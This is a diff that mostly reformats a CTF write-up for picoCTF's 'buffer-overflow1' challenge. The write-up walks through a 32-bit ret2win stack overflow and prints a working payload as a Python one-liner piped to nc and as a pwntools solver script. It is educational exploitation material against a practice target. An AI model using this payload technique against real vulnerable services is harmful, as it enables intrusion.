@@ -17,13 +17,16 @@ This is the first "proper" binary exploitation (ret2win) challenge in this CTF.
 For this challenge, I found John Hammond's [walkthrough video](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB) to be extremely helpful and informative.
 
 ## My Solution
+
 Firstly, let's download the provided files.
+
 ```bash
 wget https://artifacts.picoctf.net/c/187/vuln
 wget https://artifacts.picoctf.net/c/187/vuln.c
 ```
 
 Let's take a look at the `vuln` binary. Using `file` and `checksec`, we observe the following:
+
 ```bash
 $ file vuln
 >> vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, 
@@ -39,13 +42,16 @@ $ checksec vuln
     Stack:    Executable
     RWX:      Has RWX segments
 ```
+
 From this, we can observe that the file:
+
 - is a 32-bit ELF file,
 - is not stripped,
 - is compiled on a little-endian system, and
 - has very little protection in place (stack is executable, no stack canary).
 
 Now, looking at `vuln.c`, we can note down some interesting features.
+
 ```c
 ...
 #include "asm.h"
@@ -85,13 +91,15 @@ int main(int argc, char **argv){
   return 0;
 }
 ```
+
 We can see that the provided file has a read buffer size of 32, and has a `win()` function present. The `gets()` function is also used to retrieve user input within the `vuln()` function. Lastly, the program also prints out a return address using a `get_return_address()` function.
 
-Evidently, we will need to control the return address to call the `win()` function. Here, the program helps us to visualize the return address by printing it to standard output. 
+Evidently, we will need to control the return address to call the `win()` function. Here, the program helps us to visualize the return address by printing it to standard output.
 
 I then decided to do some experimenting to see how many 'A's will cause the printed return address to be overwritten. Without causing any segmentation fault, we observe that the program returned to this address: `0x804932f`.
 
 I then used GDB to disassemble the program, in order to see which instruction this address points to.
+
 ```bash
 $ gdb vuln
 >> ...
@@ -100,20 +108,23 @@ gef> disas main
  0x0804932f <+107>:   mov    eax,0x0
 ...
 ```
+
 It appears that this specific address is bound to a move instruction in `main()`.
 
-Through further trial and error, I found that around 44 'A's were required to clobber the return address (which was seen from the presence of 41s in the printed address - 41 is the hex representation of A). 
+Through further trial and error, I found that around 44 'A's were required to clobber the return address (which was seen from the presence of 41s in the printed address - 41 is the hex representation of A).
 
 I can then run `readelf -s vuln` to look for the address of `win()`. Through this, we note that the address is `0x080491f6`.
 
 Now, we can generate the payload. In this case, we want to order our bytes for `win()` in "reverse", since the executable runs on a little-endian system.
 
-Using Python 2.7 to pipe the payload directly into the program: 
+Using Python 2.7 to pipe the payload directly into the program:
+
 ```bash
 python -c "print 'A'*44 + '\xf6\x91\x04\x08'" | nc saturn.picoctf.net 60801 
 ```
 
 Alternatively, using Python 3 and pwntools to send the payload through a solver script:
+
 ```python
 # solve.py
 
@@ -130,7 +141,9 @@ print(p.recvuntil(':'))
 p.sendline(payload)
 p.interactive()
 ```
+
 Both methods allow us to obtain the flag.
+
 ```bash
 [+] Opening connection to saturn.picoctf.net on port 60801: Done
 solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
@@ -145,7 +158,9 @@ $
 ```
 
 ## Learning Takeaways
+
 Some general tips I picked up here:
+
 - Play around with the program to test the number of dummy characters required to clobber the return address of our intended functions. Or, how many characters do we need to determine the offset of EIP?
   - We also can use GDB/GEF to determine the offsets, but that will be covered in a later writeup. :)
 - Get familiar with `readelf`.
@@ -154,4 +169,5 @@ Some general tips I picked up here:
 - Note the differences between little-endian and big-endian.
 
 ## References
+
 - [John Hammond (YouTube): 32-bit x86 LINUX BUFFER OVERFLOW (PicoCTF 2022 #31 'buffer-overflow1')](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB)
